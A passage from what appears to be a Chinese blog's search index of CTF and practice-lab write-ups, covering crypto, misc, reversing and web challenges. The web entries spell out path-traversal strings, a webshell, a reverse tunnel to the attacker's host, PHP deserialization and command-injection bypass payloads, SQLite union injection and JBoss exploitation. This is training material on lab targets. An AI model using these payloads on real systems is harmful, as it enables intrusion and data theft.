{\"c\":85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198, \"e\": 9, \"n\":100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919}, {\"c\":14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656, \"e\": 9, \"n\":59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847}, {\"c\":11437367921082328903068635249880280987309276000664914853262144202793753046658964535441004470278094331417903311913248062058450093362283311383261637468531979905967005233284237917648436946715808755382511668649576468071840418178633142045163556836638592466771051321003773226696278938638854821","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:8:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["WriteUp"],"content":"0x08 MISC MI 事后发现是去年钓鱼城杯的原题，贴个大佬的链接。 http://www.glun.top/2020/10/05/ctf02/ ","date":"2021-10-08","objectID":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/:9:0","tags":["CTF"],"title":"2021首届鹤城杯WriteUp（MISC+CRYPTO）","uri":"/2021-10-08-2021%E9%A6%96%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AFwriteupmisccrypto/"},{"categories":["安全技术"],"content":"\r","date":"2021-09-27","objectID":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/:0:0","tags":["渗透测试","Web安全"],"title":"打靶-MoriartyCorp","uri":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/"},{"categories":["安全技术"],"content":"0x00 准备工作 查看靶机的描述信息，这里说明了flag的格式等。 Description Hello Agent. You're here on a special mission. A mission to take down one of the biggest weapons suppliers which is Moriarty Corp. Enter flag{start} into the webapp to get started! Notes: Web panel is on port 8000 (not in scope. Don’t attack) Flags are stored in #_flag.txt format. Flags are entered in flag{} format. They're usually stored in / directory but can be in different locations. To temporarily stop playing, pause the VM. Do not shut it down. The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up. (the story is bad. sorry for the lack of creativity) ","date":"2021-09-27","objectID":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-MoriartyCorp","uri":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/"},{"categories":["安全技术"],"content":"0x01 flag1 扫描端口，发现开放8000,22,9000。 浏览器上一下web服务8000，发现是用来提交flag的，同时我们也知道了第一个flag，flag{start}。 ","date":"2021-09-27","objectID":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-MoriartyCorp","uri":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/"},{"categories":["安全技术"],"content":"0x02 flag2 提交flag后，出现新信息，80端口开放了。 访问web服务 点击超链接后，怀疑存在文件包含。 构造file=../../../../../../../etc/passwd，能够得到相应的信息。 在/var/www/html中编写一句话木马，然后开启apache服务。 用蚁剑连接一下。 在根目录下找到第二个flag。 ","date":"2021-09-27","objectID":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/:3:0","tags":["渗透测试","Web安全"],"title":"打靶-MoriartyCorp","uri":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/"},{"categories":["安全技术"],"content":"0x03 flag3 根据提示信息接下来需要扫描内网172.17.0.3-254 需要利用内网代理工具Venom，先用蚁剑上传文件。 使用./admin_linux_x64 -lport 2333，监听2333端口。然后靶机使用./agent_linux_x64 -rhost 10.0.2.4 -rport 2333，连接kali。 新节点建立成功。 然后开启socks5代理，监听1080端口。 vim /etc/proxychains.conf编辑socks配置文件，添加最后一行，使得socks5连接本地的1080端口，然后proxychains不要启用DNS代理，#proxy_dns。 配置完成后，在命令前面加proxychains即可，使用sock5代理。然后开始利用nmap进行内网主机扫描。 之后靶机的docker开不起来，扫不到内网主机，就离谱，调试了很久也没法解决，先埋个坑吧，补上大佬的全流程。 http://www.maidang.cool/2021/39310.html#flag2 ","date":"2021-09-27","objectID":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/:4:0","tags":["渗透测试","Web安全"],"title":"打靶-MoriartyCorp","uri":"/2021-09-27-%E6%89%93%E9%9D%B6-moriartycorp/"},{"categories":["WriteUp"],"content":"\r","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:0:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x00 签到 from Crypto.Util.number import *\rimport random\rflag=b'flag{******************}'\rn = 2 ** 256\rflaglong=bytes_to_long(flag)\rm = random.randint(2, n-1) | 1\rc = pow(m, flaglong, n)\rprint('m = ' + str(m))\rprint('c = ' + str(c))\r# m = 73964803637492582853353338913523546944627084372081477892312545091623069227301\r# c = 21572244511100216966799370397791432119463715616349800194229377843045443048821\r这是一个求解离散对数的问题——经过查询在sage下有discrete_log函数可以直接解决问题，discrete_log(Mod(c,n),Mod(m,n))，在sagemath的docker下运行。 得到34852863801130149185238904762083023615101，利用long_to_bytes得到flag{DASCTF_zjut} ","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:1:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x02 hellounser 源代码如下： \u003c?php class A { public $var; public function show(){ echo $this-\u003evar; } public function __invoke(){ $this-\u003eshow(); } } class B{ public $func; public $arg; public function show(){ $func = $this-\u003efunc; if(preg_match('/^[a-z0-9]*$/isD', $this-\u003efunc) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026|\\$|\\*|\\||\\\u003c|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-\u003earg)) { die('No!No!No!'); } else { include \"flag.php\"; //There is no code to print flag in flag.php $func('', $this-\u003earg); } } public function __toString(){ $this-\u003eshow(); return \"\u003cbr\u003e\".\"Nice Job!!\".\"\u003cbr\u003e\"; } } if(isset($_GET['pop'])){ $aaa = unserialize($_GET['pop']); $aaa(); } else{ highlight_file(__FILE__); } ?\u003e 参考https://www.gem-love.com/ctf/770.html 现在的困难： 不能通过 system() 等函数执行系统命令，就无法 cat flag.php 过滤了 flag 等关键字，不能操作 $flag 变量 过滤了 print 等关键字，不能直接读取或类似无参数 RCE 的方法 flag.php 源代码 但是代码明确写了包含 flag.php，在不指定变量名称的情况下输出变量的值，get_defined_vars() 可以用来输出所有变量和值。构造如下的payload \u003c?php class A { public $var; } class B{ public $func; public $arg; } $a = new A(); $b = new B(); $b-\u003efunc = \"create_function\"; $b-\u003earg = \"};var_dump(get_defined_vars());//\"; $a-\u003evar = $b; echo serialize($a); #O:1:\"A\":1:{s:3:\"var\";O:1:\"B\":2:{s:4:\"func\";s:15:\"create_function\";s:3:\"arg\";s:33:\"};var_dump(get_defined_vars());//\";}} ?\u003e 上传pop的值得到 现在的困难： 过滤了 include 关键字 过滤了单引号双引号 过滤了 flag 关键字和类似无参数 RCE 题目中能够得到 1flag.php 字符串的各种函数的关键字，比如无法 scandir() 应对的策略： 过滤了 include 还能用 require 过滤了引号，可以使用那些参数可以不加引号的函数，require() 代替 require \" \" 过滤了 flag，可以 base64 编码。其他过滤的不用便是 修改 $b-\u003earg = \"};require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//\";\r","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:2:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x03 Girlfriend’s account jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？ 打开Excel，提示flag{账单总金额四舍五入保留至小数点后两位}，例如总金额为 543.21 元时，你需要提交 flag{543.21} 套用公式 =SUM(ISNUMBER(SEARCH(TEXT({1,2,3,4,5,6,7,8,9},\"[dbnum2]\"\u0026{\"0亿\";\"0仟!*万\";\"0佰!*万\";\"0拾!*万\";\"0万\";\"万!*0仟\";\"万!*0佰\";\"万!*0拾\";\"0元\";\"0角\";\"0分\"}),IF(ISERR(FIND(\"万\",A2)),\"万\",)\u0026A2))*{1,2,3,4,5,6,7,8,9}*10^{8;7;6;5;4;3;2;1;0;-1;-2}) 然后把值粘贴出来，把件数替换成阿拉伯数字。再用公式=A2*B2计算，最后=SUM(C1:C5001) ","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:3:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x03 双目失明，身残志坚 打开压缩包，得到两张图 两张看起来一样的图，blind，联想到了盲水印，解一下。 看起来像是盲文，对应的点是34,26,1245,1346,1245,256,15,145,35,125,23456 试了下转日文，发现不太行。又对照维基尝试了下汉语拼音。得到如下结果： zh(i) e/o g/j iang(yang) g/j ong(weng) ie(ye) d a h/x ue(yue)\r组合一下，惊奇地发现是zhejianggongyedaxue ","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:4:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x04 [Jboss]CVE-2017-12149 漏洞名称：Jboss 反序列化(CVE-2017-12149) 漏洞描述：JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。在/invoker/readonly路径下，攻击者可以构造序列化代码传入服务器进行反序列化,由于没有对反序列化操作进行任何检测，导致攻击者可以执行任意代码。 漏洞影响：Redhat JBoss Enterprise Application Platform 5.0 参考：https://juejin.cn/post/6869587131678294023 https://github.com/yunxu1/jboss-_CVE-2017-12149 打印环境变量env，获得flag{d0c54aa0-5bce-4fd6-84a1-e01230f23d19} ","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:5:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x05 [Jboss]CVE-2017-7504 git clone https://github.com/joaomatosf/jexboss，cd到jexboss文件夹下执行python3 jexboss.py -u http://node4.buuoj.cn:28056/，发现存在漏洞。 输入yes后，工具自动进行漏洞利用，利用成功会出现shell的命令行，可执行相关命令。 查看环境变量，得到flag。 ","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:6:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"0x06 [JBoss]JMXInvokerServlet-deserialization 同样使用jboss反序列化工具，查看环境变量即可。 ","date":"2021-09-27","objectID":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/:7:0","tags":["CTF"],"title":"近期一些CTF的writeup","uri":"/2021-09-27-%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9Bctf%E7%9A%84writeup/"},{"categories":["WriteUp"],"content":"\r","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:0:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x00 签到 题目给出了一串16进制的字符串 5a6d78685a3374585a57786a6232316c5833527658324e6f5957356e5932686c626d64695a544639\r转ascii码，得到ZmxhZ3tXZWxjb21lX3RvX2NoYW5nY2hlbmdiZTF9，再base64解码下，得到flag{Welcome_to_changchengbe1} ","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:1:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x01 baby_rsa enc.py的源码如下 #!/usr/bin/env python3\rfrom Crypto.Util.number import *\rfrom secret import flag, v1, v2, m1, m2\rdef enc_1(val):\rp, q = pow(v1, (m1+1))-pow((v1+1), m1), pow(v2, (m2+1))-pow((v2+1), m2)\rassert isPrime(p) and isPrime(q) and (\rp*q).bit_length() == 2048 and q \u003c p \u003c q \u003c\u003c 3\rreturn pow(val, 0x10001, p*q)\rdef enc_2(val):\rassert val.bit_length() \u003c 512\rwhile True:\rfac = [getPrime(512) for i in range(3)]\rif isPrime(((fac[0]+fac[1]+fac[2]) \u003c\u003c 1) - 1):\rn = fac[0]*fac[1]*fac[2]*(((fac[0]+fac[1]+fac[2]) \u003c\u003c 1) - 1)\rbreak\rc = pow(val, 0x10001, n)\rreturn (c, n, ((fac[0]+fac[1]+fac[2]) \u003c\u003c 1) - 1)\rif __name__ == \"__main__\":\rassert flag[:5] == b'flag{'\rplain1 = bytes_to_long(flag[:21])\rplain2 = bytes_to_long(flag[21:])\rprint(enc_1(plain1))\rprint(enc_2(plain2))\renc_1的加密，参照大佬的wp复现 v1, v2, m1, m2可爆，然后enc_2，m很小不需要这么多模数，只需要知道p就好了，然后记得v1确定之后框定一下m1的范围就很快可以爆破出来。脚本如下： #!/usr/bin/env python3 # -*- coding: utf-8 -*- from Crypto.Util.number import * from gmpy2 import * from math import log import sys c1 = 15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311 c2 = (40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083, 43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269, 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739) e = 0x10001 # enc_2 c2, n2, x = c2[0], c2[1], c2[2] assert n2 % x == 0 n2 = x p1 = 191 p2 = 193 p3 = 627383 p4 = 1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710491 phi2 = (p1 - 1) * (p2 - 1) * (p3 - 1) * (p4 - 1) d2 = invert(e, phi2) m2 = pow(c2, d2, n2) flag2 = long_to_bytes(m2) # enc_1 lbound, ubound = 2 ** 1021, 2 ** 1027 for v1 in range(2, 1000000): for m1 in range(int(log(lbound, v1)), int(log(ubound, v1))): p = pow(v1, (m1 + 1)) - pow((v1 + 1), m1) if isPrime(p) and 1021 \u003c p.bit_length() \u003c 1027: phi1 = p - 1 d1 = invert(e, phi1) m = pow(c1, d1, p) if long_to_bytes(m).startswith(b'flag'): flag1 = long_to_bytes(m) flag = flag1 + flag2 print(flag) sys.exit(0) ","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:2:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x02 Just_cmp-re 直接丢到ida里面去分析，在主函数发现进行了flag的字符串比较。 对输入的字符进行右移3位相当于除8，也就是把字符串分为8个一组，对应和qword_201060的值做减法，可以得到主函数里显示的字符串。 数组元素的值如下： 编写脚本如下： #-*- coding:utf-8 -*-\renc = \"flag{********************************}\"\rm = [0x0A07370000000000,\r0x380B06060A080A37,\r0x3B0F0E38083B0A07,\r0x373B0709060B0A3A,\r0x0000000F38070F0D]\rimport binascii\rflag = b''\rfor i in range(5):\rp = enc[i*8:(i+1)*8]\ra = binascii.b2a_hex(p.encode('ascii')[::-1])\rb = binascii.a2b_hex(hex(int(a,16) + m[i])[2:])[::-1]\rflag += b\rprint (flag)\rflag{a14a424005b14e2b89ed45031ea791b9} ","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:3:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x03 java_url 首页源代码中有一条注释，初步推测此处的利用包含漏洞找flag文件。 先在download路径下发现 filename输入的字符串包含flag时，返回信息有变化。 filename=../确定存在文件包含漏洞，并且泄露tomcat的绝对路径/usr/local/tomcat/webapps/ROOT/WEB-INF/。 然后构造 filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml\r下载到本地可以看到 从而确定.class文件的路径WEB-INF/classes/com/test2/aaa1，接着构造 filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/test2/aaa1/testURL.class filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/test2/aaa1/download.class 使用jd-gui-1.6.6.jar进行反编译分析class文件，发现download.class中的过滤flag。 testURL.class中可以通过/testURL?url=url:file:///flag或者/testURL?url=%00file:///flag来进行绕过。 ","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:4:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x04 你这flag保熟吗 打开文件发现有两张图和一个加密的rar压缩包。 丢到binwalk发现都有一个压缩包，foremost分离一下。 得到⼀个password.excel和⼀个hint，提示base64还给出了一个序列。 在表格中画出来，看了dalao的wp才知道是个希尔伯特曲线。 套一下脚本 from hilbertcurve.hilbertcurve import HilbertCurve\rimport xlrd\rreadbook = xlrd.open_workbook('password.xls')\rsheet = readbook.sheet_by_index(0)\rf = open('base64.txt','w+')\rhilbert_curve = HilbertCurve(17, 2)\rbase64 = ''\rfor i in range(65536):\r[j,k] = hilbert_curve.point_from_distance(i)\rbase64 += sheet.cell(j,k).value\rf.write(base64)\r得到⼀⼤串base64和很多=，删除到只剩俩。循环解base64，最后得到1f_y0u_h4ve_7he_fllllllag,_I_muSt_vvant_1t!，解压文件发现类似brainfuck的代码。前面所有的.(点)都被出题人删了，而作用是输出指针指向的单元内容，所以前面那一长串都无法输出，值只能被保留在对应单元中。在https://fatiherikli.github.io/brainfuck-visualizer，可以看到每个单元里面的信息，运行一段时间后，得到： 拼凑一下，得到：117,111,122,116,123,83,114,82,121,118,105,103,95,88,102,105,101,118,95,49,72,95,52,95,101,101,48,109,119,118,105,117,102,33,95,120,102,105,101,118,125 转为ascll，得到uozt{SrRyvig_Xfiev_1H_4_ee0mwviuf!_xfiev} 用atbash解密一下，得到flag{HiIbert_Curve_1S_4_vv0nderfu!_curve} ","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:5:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"0x05 ez_python 题目内容：樱桃猫写了自己的第一个flask网站，你能帮他看看有什么问题吗？ 打开首页，看看源代码。 传入pic参数后，页面的返回图片会变化。 ","date":"2021-09-24","objectID":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/:6:0","tags":["CTF"],"title":"长城杯writeup","uri":"/2021-09-24-%E9%95%BF%E5%9F%8E%E6%9D%AFwriteup/"},{"categories":["WriteUp"],"content":"\r","date":"2021-09-17","objectID":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/:0:0","tags":["CTF"],"title":"攻防世界web高手篇（021-025）","uri":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/"},{"categories":["WriteUp"],"content":"0x00 Cat 题目描述：抓住那只猫 输入127.0.0.1或者0.0.0.0有回显，baidu.com等无回显，输入管道符等会被判定为Invalid URL FUZZ测试一下，https://blog.csdn.net/qq_17204441/article/details/102279118，wfuzz -w 字典 url?参数=FUZZ，发现@没有被过滤 输入字符编码，不会报错，但是%80会出错，因为django后端使用的gbk编码，ASCII码的编码范围0-127，%80相当于128 ，所以推断是由unicode解码失败导致的，将报错的代码复制出来，存为html打开，显示django的报错信息，包括请求方式、api接口等等。 这里补一个hint，RTFM of PHP CURL===»read the fuck manul of PHP CURL???，里面提到了PHP CURL的概念，参照https://jasonhzy.github.io/2016/05/04/php-curl-file/，可以知道PHP的cURL支持通过在数组数据中，使用“@+文件全路径”的语法附加文件，供cURL读取上传。 django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。 所以构造@/opt/api/database.sqlite3就可以利用CURLOPT_SAFE_UPLOAD为TRUE，禁用@前缀在 CURLOPT_POSTFIELDS 中发送文件的特性，把数据库文件的内容post给django，但是因为编码问题，报错了，就能够看到数据库里面的内容。为了方便观察，将代码再拷贝成html文件查看。得到flag。 ","date":"2021-09-17","objectID":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/:1:0","tags":["CTF"],"title":"攻防世界web高手篇（021-025）","uri":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/"},{"categories":["WriteUp"],"content":"0x01 favorite_number 代码如下： \u003c?php\r//php5.5.9\r$stuff = $_POST[\"stuff\"];\r$array = ['admin', 'user'];\rif($stuff === $array \u0026\u0026 $stuff[0] != 'admin') {\r$num= $_POST[\"num\"];\rif (preg_match(\"/^\\d+$/im\",$num)){\rif (!preg_match(\"/sh|wget|nc|python|php|perl|\\?|flag|}|cat|echo|\\*|\\^|\\]|\\\\\\\\|'|\\\"|\\|/i\",$num)){\recho \"my favorite num is:\";\rsystem(\"echo \".$num);\r}else{\recho 'Bonjour!';\r}\r}\r} else {\rhighlight_file(__FILE__);\r} 首先要求stuff强等于array，首元素还不能为‘admin’，php的版本应该是提示信息，查阅资料发现。可以利用PHP的数组下标的BUG实现整型溢出，https://segmentfault.com/q/1010000003871264，https://bugs.php.net/bug.php?id=69892，所以能够构造。 stuff[4294967296]=admin\u0026stuff[1]=user\u0026num=1\rstuff[4294967296]=admin\u0026stuff[]=user\u0026num=2\rstuff[-4294967296]=admin\u0026stuff[1]=user\u0026num=3\rstuff[4294967296]=admin\u0026stuff[4294967297]=user\u0026num=4\r2\u003csup\u003e32\u003c/sup\u003e=4294967296\r确实可以绕过第一个判断。 下面绕过数字的判断，可以使用换行符%0a绕过跨行匹配。注意：不能使用hackbar来执行payload，因为火狐浏览器会自动在换行符%0a前面加上回车符%0d，凑成%0d%0a，使绕过失败。于是构造num=1%0als /。发现了flag文件。 接着需要绕过黑名单。这里参考https://www.cnblogs.com/zhengna/p/13962572.html，https://blog.csdn.net/rfrder/article/details/111482200 方法1 用inode索引节点 先使用ls -i /命令寻找flag的inode号 构造num=1%0ahead `find / -inum 23593771`，反引号绕过单双引号过滤。 方法2 将文件名输出到文件里，然后执行文件。 构造payload num=1%0aprintf /fla \u003e /tmp/1;printf g \u003e\u003e /tmp/1;head `head /tmp/1`\r方法3 变量拼接 构造num=1%0ax=/fla;y=g;tac $x$y *方法4 $和$@ $*和$@，$x(x 代表 1-9),${x}(x\u003e=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空\rnum=1%0aca$1t /fla$1g\rnum=1%0aca$@t /fla$@g\r","date":"2021-09-17","objectID":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/:2:0","tags":["CTF"],"title":"攻防世界web高手篇（021-025）","uri":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/"},{"categories":["WriteUp"],"content":"0x02 lottery 规则如下，输入7个数字，如果有相同的，会获得对应的奖励。 flag也可以购买 扫描发现存在git 用githack下载下来 审计代码发现在api.php中，存在php弱比较。 for($i=0; $i\u003c7; $i++){\rif($numbers[$i] == $win_numbers[$i]){\r$same_count++;\r}\r}\r参照https://www.php.net/manual/zh/types.comparisons.php，可以发现int型与true的比较结果都为true。最后构造{\"action\":\"buy\",\"numbers\":[true,true,true,true,true,true,true]}，成功得到奖金。 攒到足够的钱，买flag ","date":"2021-09-17","objectID":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/:3:0","tags":["CTF"],"title":"攻防世界web高手篇（021-025）","uri":"/2021-09-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87021-025/"},{"categories":["WriteUp"],"content":"0x03 FlatScience 上扫描器，扫到了一些好东西。 发现管理员页面，提供了一个默认的账户名admin。 查看源码，发现hint，提示我们不要尝试绕过。 在login.php存在hint，猜测有debug的页面。 输入url/?debug=1，看到数据库为SQLite3。 \u003c?php if(isset($_POST['usr']) \u0026\u0026 isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-\u003equery(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res){ $row = $res-\u003efetchArray(); } else{ echo \"\u003cbr\u003eSome Error occourred!\"; } if(isset($row['id'])){ setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); } } if(isset($_GET['debug'])) highlight_file('login.php'); ?\u003e SQLite数据库只有它本身一个数据库，有一个sqlite_master隐藏表，里面存放我们建表的记录。构造' union select name,sql from sqlite_master--抓包进行分析。 经过url解密得到信息 CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))\r接着分别查询hint，name，password。结果如下： my fav word in my fav paper?!,my love isâ¦?,the password is password admin,fritze,hansi 3fab54a50e770d830c0416df817567662a9dc85c,54eae8935c90f467427f05e4ece82cf569f89507,34b0bb7c304949f9ff2fc101eef0f048be10d3bd 根据admin的密码MD5值，查到ThinJerboaSalz!，所以密码为 ThinJerboa 。在管理员页面登录得到flag 不过比赛时，应该解不出md5值的。根据hint，他的密码应该和pdf有关，使用网上的脚本，python3爬取多目标网页PDF文件并下载到指定目录： import requests\rimport re\rimport os\rimport sys\rre1 = '[a-fA-F0-9]{32,32}.pdf'\rre2 = '[0-9\\/]{2,2}index.html'\rpdf_list = []\rdef get_pdf(url):\rglobal pdf_list print(url)\rreq = requests.get(url).text\rre_1 = re.findall(re1,req)\rfor i in re_1:\rpdf_url = url+i\rpdf_list.append(pdf_url)\rre_2 = re.findall(re2,req)\rfor j in re_2:\rnew_url = url+j[0:2]\rget_pdf(new_url)\rreturn 